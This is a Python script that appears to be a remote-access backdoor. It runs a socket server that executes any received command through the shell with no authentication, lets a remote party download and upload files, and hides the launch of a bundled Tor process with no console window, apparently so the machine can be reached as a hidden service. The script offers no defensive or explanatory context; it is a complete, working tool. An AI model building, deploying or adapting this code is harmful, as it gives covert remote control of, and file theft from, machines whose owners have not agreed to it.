import socket
import os
import subprocess
import threading
import struct
import sys

HOST = '127.0.0.1'
PORT = 6781


def send_frame(conn, data: bytes):
    """Send length-prefixed frame: 4-byte big-endian length + data."""
    conn.sendall(struct.pack('>I', len(data)) + data)


def recv_frame(conn) -> bytes:
    """Receive a length-prefixed frame. Returns raw bytes."""
    raw_len = recv_exact(conn, 4)
    if not raw_len:
        return b''
    length = struct.unpack('>I', raw_len)[0]
    return recv_exact(conn, length)


def recv_exact(conn, n: int) -> bytes:
    """Read exactly n bytes from socket, blocking until done."""
    buf = b''
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Socket closed mid-read")
        buf += chunk
    return buf


def handle_client(conn, addr):
   
    cwd = os.getcwd()
    print(f"[+] Client connected: {addr}")

    try:
        while True:
            try:
                data = recv_frame(conn)
            except (ConnectionError, struct.error):
                break

            if not data:
                break

            cmd = data.decode('utf-8', errors='ignore').strip()
            if not cmd:
                continue

            print(f"[*] [{addr}] Command: {cmd}")

            if cmd.startswith("download "):
                filename = cmd[9:].strip()
                file_path = os.path.join(cwd, filename)

                if os.path.isfile(file_path):
                    try:
                        with open(file_path, "rb") as f:
                            file_data = f.read()
                        
                        send_frame(conn, b"EXISTS")
                        
                        send_frame(conn, file_data)
                    except Exception as e:
                        send_frame(conn, f"ERR {e}".encode())
                else:
                    send_frame(conn, b"ERR File not found")

            
            elif cmd.startswith("upload "):
                filename = cmd[7:].strip()
                file_path = os.path.join(cwd, filename)

                
                send_frame(conn, b"READY")

                try:
                    file_data = recv_frame(conn)
                    with open(file_path, "wb") as f:
                        f.write(file_data)
                    send_frame(conn, f"OK Saved {len(file_data)} bytes as {filename}".encode())
                except Exception as e:
                    send_frame(conn, f"ERR {e}".encode())

            
            elif cmd.startswith("cd "):
                new_path = cmd[3:].strip()
                try:
                    target = os.path.join(cwd, new_path)
                    os.chdir(target)
                    cwd = os.getcwd()
                    send_frame(conn, f"CWD {cwd}".encode())
                except Exception as e:
                    send_frame(conn, f"ERR {e}".encode())

           
            else:
                try:
                    output = subprocess.check_output(
                        cmd,
                        shell=True,
                        cwd=cwd,
                        stderr=subprocess.STDOUT
                    )
                    send_frame(conn, output if output else b"(no output)")
                except subprocess.CalledProcessError as e:
                    send_frame(conn, e.output if e.output else str(e).encode())
                except Exception as e:
                    send_frame(conn, str(e).encode())

    except Exception as e:
        print(f"[!] Session error [{addr}]: {e}")
    finally:
        conn.close()
        print(f"[-] Client disconnected: {addr}")


def run_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] Server listening on {HOST}:{PORT}")

        while True:
            try:
                conn, addr = s.accept()
                t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
                t.start()
            except Exception as e:
                print(f"[!] Accept error: {e}")


def run_tor():
    tor_path = os.path.join(".", "tor.exe")
    torrc_path = os.path.join(".", "torrc")
    kwargs = {}
    if os.name == 'nt':
        kwargs['creationflags'] = subprocess.CREATE_NO_WINDOW

    try:
        if os.path.exists(tor_path):
            subprocess.Popen([tor_path, "-f", torrc_path], shell=False, **kwargs)
        else:
            print("[!] Tor executable not found, skipping.")
    except Exception as e:
        print(f"[!] Failed to start Tor: {e}")


if __name__ == "__main__":
    t1 = threading.Thread(target=run_tor, daemon=True)
    t2 = threading.Thread(target=run_server, daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
